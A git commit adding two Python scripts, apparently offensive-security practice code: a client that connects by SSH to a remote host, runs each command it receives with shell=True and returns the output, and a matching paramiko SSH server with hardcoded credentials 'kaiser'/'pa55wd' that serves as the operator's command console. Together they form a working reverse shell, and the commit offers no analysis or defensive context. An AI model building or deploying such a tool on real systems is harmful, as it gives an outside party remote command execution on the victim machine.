dc411e82023b3f2109f74cf89e44175cb72ab5cf
Zhang liangliang <zhangliangliang1996@hotmail.com>
2019-08-30 22:08:57 +0800

    :sparkles: Add ssh server.

---
+++ netbase/bhssh_Rcmd.py
@@ -0,0 +1,53 @@
+import threading
+import paramiko
+import subprocess
+import sys
+
+
+def ssh_cmd(ip, port, user, passwd, command):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(ip, port=port, username=user, password=passwd)
+    ssh_session = client.get_transport().open_session()
+
+    if ssh_session.active:
+        print("[+] Connect to server.")
+
+        ssh_session.send(command)
+        print("[====>] " + str(ssh_session.recv(1024), encoding="utf-8"))
+        while True:
+            command = str(
+                ssh_session.recv(1024), encoding="utf-8"
+            )  # get the command from the SSH server.
+            try:
+                cmd_output = subprocess.check_output(command, shell=True)
+                ssh_session.send(cmd_output)
+
+            except Exception as e:
+                ssh_session.send(str(e))
+                break
+
+    else:
+        print("[-] Connect failed.")
+
+    client.close()
+    return
+
+
+def main():
+    if len(sys.argv[1:]) != 5:
+        print("Usage: ./bhssh_cmd.py [ip] [port] [user] [passwd] [command]")
+        print("Example: ./bhssh_cmd.py 127.0.0.1 2200 kaiser pa55wd ls")
+        sys.exit(0)
+
+    ip = sys.argv[1]
+    port = sys.argv[2]
+    user = sys.argv[3]
+    passwd = sys.argv[4]
+    command = sys.argv[5]
+
+    ssh_cmd(ip, port, user, passwd, command)
+
+
+if __name__ == "__main__":
+    main()
---
+++ netbase/bhssh_server.py
@@ -0,0 +1,84 @@
+import socket
+import paramiko
+import threading
+import sys
+
+host_key = paramiko.RSAKey(filename="test_rsa.key")
+
+
+class Server(paramiko.ServerInterface):
+    def __init__(self):
+        self.event = threading.Event()
+
+    def check_channel_request(self, kind, chanid):
+        if kind == "session":
+            return paramiko.OPEN_SUCCEEDED
+
+        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+
+    def check_auth_password(self, username, passwd):
+        if username == "kaiser" and passwd == "pa55wd":
+            return paramiko.AUTH_SUCCESSFUL
+
+        return paramiko.AUTH_FAILED
+
+
+def main():
+    server = sys.argv[1]
+    ssh_port = int(sys.argv[2])
+
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind((server, ssh_port))
+        sock.listen(100)
+        print("[+] Listening for connection ...")
+
+        client, addr = sock.accept()
+
+    except Exception as e:
+        print("[-] Listen failed: " + str(e))
+        sys.exit(1)
+
+    print("[+] Got a connection!")
+
+    try:
+        bhSession = paramiko.Transport(client)
+        bhSession.add_server_key(host_key)
+        server = Server()
+
+        try:
+            bhSession.start_server(server=server)
+        except paramiko.SSHException as e:
+            print("[-] SSH negotiation failed.")
+
+        chan = bhSession.accept(20)
+        print("[+] Authenticated!")
+        print(str(chan.recv(1024), encoding="utf-8"))
+        chan.send("Welcome to bh_ssh.")
+
+        while True:
+            try:
+                command = input("Enter command: ").strip("\n")
+                if command != "exit":
+                    chan.send(command)
+                    print(str(chan.recv(1024), encoding="utf-8"))
+                else:
+                    chan.send("exit")
+                    print("[+] Exiting.")
+                    bhSession.close()
+                    raise Exception("exit")
+            except KeyboardInterrupt:
+                bhSession.close()
+
+    except Exception as e:
+        print("[-] Caught exception: " + str(e))
+        try:
+            bhSession.close()
+        except:
+            pass
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
